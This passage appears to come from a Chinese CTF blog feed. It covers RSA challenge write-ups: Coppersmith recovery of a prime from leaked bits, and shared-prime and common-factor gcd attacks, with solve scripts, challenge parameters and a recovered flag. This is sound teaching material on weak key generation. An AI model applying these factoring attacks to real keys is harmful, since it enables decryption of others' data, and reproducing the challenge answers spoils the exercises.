punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sage脚本"><a href="#sage脚本" class="headerlink" title="sage脚本"></a>sage脚本</h4><p>先求p的低位p0</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">mod<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">265</span><span class="token punctuation">)</span>p0<span class="token operator">=</span>n<span class="token operator">*</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>hint2<span class="token punctuation">,</span>mod<span class="token punctuation">)</span><span class="token operator">%</span>mod<span class="token keyword">print</span><span class="token punctuation">(</span>p0<span class="token punctuation">)</span><span class="token comment">#30417487794073877577997977068358253483488121930635899911316665665825597484019031</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后用sage脚本求p</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> p1 <span class="token operator">=</span> <span class="token number">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span>q0 <span class="token operator">=</span> <span class="token number">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span>n <span class="token operator">=</span> <span class="token number">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span>mod<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">265</span><span class="token punctuation">)</span>p0<span class="token operator">=</span><span class="token number">30417487794073877577997977068358253483488121930635899911316665665825597484019031</span>pbar<span class="token operator">=</span><span class="token punctuation">(</span>p1<span class="token operator">&lt;&lt;</span><span class="token number">724</span><span class="token punctuation">)</span><span class="token operator">+</span>p0<span class="token comment">#sage</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f<span class="token operator">=</span>pbar<span class="token operator">+</span>x<span class="token operator">*</span>mod<span class="token operator">*</span><span class="token number">32</span>    f<span class="token operator">=</span>f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    pp<span class="token operator">=</span>f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">454</span><span class="token punctuation">,</span>beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pp<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    pbar<span class="token operator">+=</span>mod p<span class="token operator">=</span>pbar<span class="token operator">+</span>pp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">*</span>mod<span class="token keyword">assert</span> n<span class="token operator">%</span>p<span class="token operator">==</span><span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后利用利用脚本求flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span>ct <span class="token operator">=</span> <span class="token number">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span>p<span class="token operator">=</span><span class="token number">133637329398256221348922087205912367118213472434713498908220867690672019569057789598459580146410501473689139466275052698529257254973211963162087316149628000798221014338373126500646873612341158676084318494058522014519669302359038980726479317742766438142835169562422371156257894374341629012755597863752154328407</span>q<span class="token operator">=</span>n<span class="token operator">//</span>pphi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>ct<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#flag&#123;ef5e1582-8116-4f61-b458-f793dc03f2ff&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>共享素数</title>
      <link href="/2023/01/14/%E5%85%B1%E4%BA%AB%E7%B4%A0%E6%95%B0/"/>
      <url>/2023/01/14/%E5%85%B1%E4%BA%AB%E7%B4%A0%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="出题脚本"><a href="#出题脚本" class="headerlink" title="出题脚本"></a>出题脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># from Crypto.Util.number import *</span><span class="token comment"># from flag import *</span><span class="token comment">#</span><span class="token comment"># n1 = 103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span><span class="token comment"># n2 = 115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span><span class="token comment"># e = 65537</span><span class="token comment"># m = bytes_to_long(flag)</span><span class="token comment"># c = pow(m, e, n1)</span><span class="token comment"># c = pow(c, e, n2)</span><span class="token comment">#</span><span class="token comment"># print("c = %d" % c)</span><span class="token comment"># output</span><span class="token comment"># c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumc <span class="token operator">=</span> <span class="token number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span>n1 <span class="token operator">=</span> <span class="token number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span>n2 <span class="token operator">=</span> <span class="token number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span>e <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">)</span>q1 <span class="token operator">=</span> n1 <span class="token operator">//</span> pq2 <span class="token operator">=</span> n2 <span class="token operator">//</span> pphi1 <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>phi2 <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q2<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi1<span class="token punctuation">)</span>d2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi2<span class="token punctuation">)</span>c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d2<span class="token punctuation">,</span>n2<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>d1<span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>公因数攻击</title>
      <link href="/2023/01/14/%E5%85%AC%E5%9B%A0%E6%95%B0%E6%94%BB%E5%87%BB/"/>
      <url>/2023/01/14/%E5%85%AC%E5%9B%A0%E6%95%B0%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>由题目得一组m,e对应不同组的n,c则可以尝试公因数攻击，对所有n进行两两对比看看有没有公因数 然后求出m</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesn1 <span class="token operator">=</span> <span class="token number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span>c1 <span class="token operator">=</span> <span class="token number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span>n2 <span class="token operator">=</span> <span class="token number">20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span>c2 <span class="token operator">=</span> <span class="token number">15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span>n3 <span class="token operator">=</span> <span class="token number">25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span>c3 <span class="token operator">=</span> <span class="token number">4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span>n4 <span class="token operator">=</span> <span class="token number">21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span>c4 <span class="token operator">=</span> <span class="token number">4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span>n5 <span class="token operator">=</span> <span class="token number">22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span>c5 <span class="token operator">=</span> <span class="token number">15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span>n6 <span class="token operator">=</span> <span class="token number">21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span>c6 <span class="token operator">=</span> <span class="token number">20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span>n7 <span class="token operator">=</span> <span class="token number">25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span>c7 <span class="token operator">=</span> <span class="token number">19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span>n8 <span class="token operator">=</span> <span class="token number">22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span>c8 <span class="token operator">=</span> <span class="token number">6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span>n9 <span class="token operator">=</span> <span class="token number">23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span>c9 <span class="token operator">=</span> <span class="token number">5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span>n10 <span class="token operator">=</span> <span class="token number">28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span>c10 <span class="token operator">=</span> <span class="token number">9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span>n11 <span class="token operator">=</span> <span class="token number">22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span>c11 <span class="token operator">=</span> <span class="token number">1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span>n12 <span class="token operator">=</span> <span class="token number">27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span>c12 <span class="token operator">=</span> <span class="token number">21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span>n13 <span class="token operator">=</span> <span class="token number">20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span>c13 <span class="token operator">=</span> <span class="token number">14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span>n14 <span class="token operator">=</span> <span class="token number">27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span>c14 <span class="token operator">=</span> <span class="token number">3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span>n15 <span class="token operator">=</span> <span class="token number">27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span>c15 <span class="token operator">=</span> <span class="token number">14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span>n16 <span class="token operator">=</span> <span class="token number">25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span>c16 <span class="token operator">=</span> <span class="token number">17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span>n17 <span class="token operator">=</span> <span class="token number">23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span>c17 <span class="token operator">=</span> <span class="token number">10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span>n18 <span class="token operator">=</span> <span class="token number">19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span>c18 <span class="token operator">=</span> <span class="token number">3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span>n19 <span class="token operator">=</span> <span class="token number">19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span>c19 <span class="token operator">=</span> <span class="token number">6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span>n20 <span class="token operator">=</span> <span class="token 